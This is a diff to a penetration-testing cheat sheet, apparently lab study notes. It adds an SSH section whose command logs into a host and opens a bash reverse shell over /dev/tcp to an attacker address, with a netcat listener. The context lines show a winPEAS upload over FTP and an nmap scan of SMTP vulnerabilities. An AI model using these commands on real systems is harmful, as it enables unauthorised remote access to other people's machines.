@@ -41,6 +41,14 @@ ftp> binary
 ftp> put winPEASx86.exe
 ````
 
+#### SSH port 22
+##### Emumeration
+##### Exploitation
+````
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa bob@10.11.1.141 -t 'bash -i >& /dev/tcp/192.168.119.140/443 0>&1'
+
+nc -nvlp 443
+````
 #### SMTP port 25
 ````
 nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25
